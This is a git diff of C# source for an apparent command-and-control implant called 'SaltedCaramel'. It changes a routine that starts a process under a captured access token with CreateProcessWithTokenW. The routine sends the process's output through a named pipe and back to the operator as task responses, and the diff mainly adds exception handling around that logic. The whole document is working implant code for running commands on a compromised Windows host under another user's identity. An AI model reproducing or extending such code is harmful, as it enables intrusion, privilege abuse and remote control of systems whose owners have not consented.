@@ -77,56 +77,66 @@ namespace SaltedCaramel
             STARTUPINFO startupInfo = new STARTUPINFO();
             string directory = "C:\\Temp";
 
-            NamedPipeServerStream pipeServer = new NamedPipeServerStream("CaramelPipe", PipeDirection.InOut);
-
-            NamedPipeClientStream pipeClient = new NamedPipeClientStream("CaramelPipe");
-            pipeClient.Connect();
-            pipeServer.WaitForConnection();
-
-            if (pipeClient.IsConnected)
+            try
             {
-                startupInfo.hStdInput = pipeClient.SafePipeHandle.DangerousGetHandle();
-                startupInfo.hStdOutput = pipeClient.SafePipeHandle.DangerousGetHandle();
-            }
-            else implant.SendError(task.id, "[!] DispatchTask -> StartProcessWithToken - ERROR connecting to named pipe");
+                NamedPipeServerStream pipeServer = new NamedPipeServerStream("CaramelPipe", PipeDirection.InOut);
 
+                NamedPipeClientStream pipeClient = new NamedPipeClientStream("CaramelPipe");
+                pipeClient.Connect();
+                pipeServer.WaitForConnection();
 
-            bool createProcess = CreateProcessWithTokenW(TokenHandle, IntPtr.Zero, file, argString, IntPtr.Zero, IntPtr.Zero, directory, ref startupInfo, out newProc);
-            if (createProcess)
-            {
-                Debug.WriteLine("[-] DispatchTask -> StartProcessWithToken - Created process with PID " + newProc.dwProcessId);
-
-                Process test = Process.GetProcessById(GetProcessId(newProc.hProcess));
-                Debug.WriteLine("Got process handle!");
-
-                IntPtr wait = (IntPtr) 1;
-                ThreadPool.QueueUserWorkItem((p) => wait = WaitForSingleObject(newProc.hProcess, (UInt32)1));
-                while (wait != IntPtr.Zero)
+                if (pipeClient.IsConnected)
                 {
-                    using (StreamReader reader = new StreamReader(pipeServer))
+                    startupInfo.hStdInput = pipeClient.SafePipeHandle.DangerousGetHandle();
+                    startupInfo.hStdOutput = pipeClient.SafePipeHandle.DangerousGetHandle();
+                }
+                else
+                {
+                    Debug.WriteLine("[!] DispatchTask -> StartProcessWithToken - ERROR connecting to named pipe");
+                    throw new Exception("Error connecting to named pipe server.");
+                }
+
+                bool createProcess = CreateProcessWithTokenW(TokenHandle, IntPtr.Zero, file, argString, IntPtr.Zero, IntPtr.Zero, directory, ref startupInfo, out newProc);
+                if (createProcess)
+                {
+                    Debug.WriteLine("[-] DispatchTask -> StartProcessWithToken - Created process with PID " + newProc.dwProcessId);
+
+                    Process test = Process.GetProcessById(GetProcessId(newProc.hProcess));
+                    Debug.WriteLine("Got process handle!");
+
+                    IntPtr wait = (IntPtr)1;
+                    ThreadPool.QueueUserWorkItem((p) => wait = WaitForSingleObject(newProc.hProcess, (UInt32)1));
+                    while (wait != IntPtr.Zero)
                     {
-                        string message = reader.ReadLine();
-                        if (message != null)
+                        using (StreamReader reader = new StreamReader(pipeServer))
                         {
-                            message += "\n";
-                            TaskResponse response = new TaskResponse(JsonConvert.SerializeObject(message), task.id);
-                            implant.PostResponse(response);
+                            string message = reader.ReadLine();
+                            if (message != null)
+                            {
+                                message += "\n";
+                                TaskResponse response = new TaskResponse(JsonConvert.SerializeObject(message), task.id);
+                                implant.PostResponse(response);
+                            }
                         }
                     }
-                }
-                Debug.WriteLine(wait);
+                    Debug.WriteLine(wait);
 
-                pipeClient.Close();
-                pipeServer.Close();
-                implant.SendComplete(task.id);
+                    pipeClient.Close();
+                    pipeServer.Close();
+                    implant.SendComplete(task.id);
+                }
+                else // TODO: Throw exception on error
+                {
+                    string errorMessage = Marshal.GetLastWin32Error().ToString();
+                    Debug.WriteLine("[!] DispatchTask -> StartProcessWithToken - ERROR starting process: " + errorMessage);
+                    pipeClient.Close();
+                    pipeServer.Close();
+                    implant.SendError(task.id, "Error starting process: " + errorMessage);
+                }
             }
-            else // TODO: Throw exception on error
+            catch (Exception e)
             {
-                string errorMessage = Marshal.GetLastWin32Error().ToString();
-                Debug.WriteLine("[!] DispatchTask -> StartProcessWithToken - ERROR starting process: " + errorMessage);
-                pipeClient.Close();
-                pipeServer.Close();
-                implant.SendError(task.id, "Error starting process: " + errorMessage);
+                implant.SendError(task.id, "Error: " + e.Message);
             }
         }
 
